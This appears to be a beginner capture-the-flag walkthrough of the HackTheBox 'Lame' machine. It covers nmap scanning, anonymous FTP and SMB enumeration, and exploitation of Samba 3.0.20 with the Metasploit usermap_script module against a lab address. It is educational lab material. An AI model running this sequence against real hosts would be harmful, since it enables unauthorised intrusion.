Lets kick this off by using nmap to scan the target
`nmap -A 10.10.10.3 |tee -a lame.txt`
The `-A` flag sets the scan to agressive...not always the best choice, but I am in a bit of a mood!


```shell

PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```


1st try anonymous ftp login and enum.

```shell

ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 .
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 ..
226 Directory send OK.
ftp> pwd
257 "/"
ftp> cd ..

```

2nd try smbclient and port 445 enum.

```shell

root@kali:~/HTB/prep/lame# smbclient -L 10.10.10.3
Enter WORKGROUP\root's password: 
Anonymous login successful

	Sharename       Type      Comment

	opt             Disk      
	IPC$            IPC       IPC Service (lame server (Samba 3.0.20-Debian))
	ADMIN$          IPC       IPC Service (lame server (Samba 3.0.20-Debian))

	Server               Comment

	Workgroup            Master
	---------            -------
	WORKGROUP            LAME
```

We can see that the target is running Samba 3.0.20-Debian, maybe it has some known 
vulnerability we can find, but first lets take the hint and explore `tmp` 

```shell

root@kali:~/HTB/prep/lame# smbclient //10.10.10.3/tmp
Enter WORKGROUP\root's password: 
Anonymous login successful

Nothing immediately helpful here...so lets check Searchsploit for possible known exploits.

Searchsploit reveals a metasploit exploit for Samba 3.x
Ok lets see how effective it is...

Start up msfconsole, then:

`use exploit/multi/samba/usermap_script`
use the command `show options` to see what info is required to make this work...
`set rhosts 10.10.10.3`
pull the trigger with `exploit` command...


```plaintext

Oh, right....that was quick. I can see where the box gets its name from now;
Nobody in their right mind should still be running this Samba version!

A good easy box for beginners to get to have a go at the basic tools, and methodology.
Lets quickly move on to another box...
